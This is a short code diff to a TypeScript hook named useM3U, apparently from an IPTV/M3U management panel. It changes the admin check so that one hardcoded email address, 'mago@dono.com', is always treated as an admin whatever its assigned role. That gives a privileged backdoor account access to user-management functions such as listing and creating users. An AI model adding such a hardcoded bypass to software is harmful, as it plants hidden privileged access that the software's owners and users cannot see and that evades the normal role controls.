@@ -379,7 +379,7 @@ export function useM3U() {
     isAuthenticated,
     login,
     logout,
-    isAdmin: panelAccount.role === "admin",
+    isAdmin: panelAccount.username === "mago@dono.com" || panelAccount.role === "admin",
     adminFunctions: {
       listUsers: () => listUsersServerFn({ data: { adminUsername: panelAccount.username } }),
       createUser: (u: string, p: string, r: 'admin' | 'user', l: number) => 
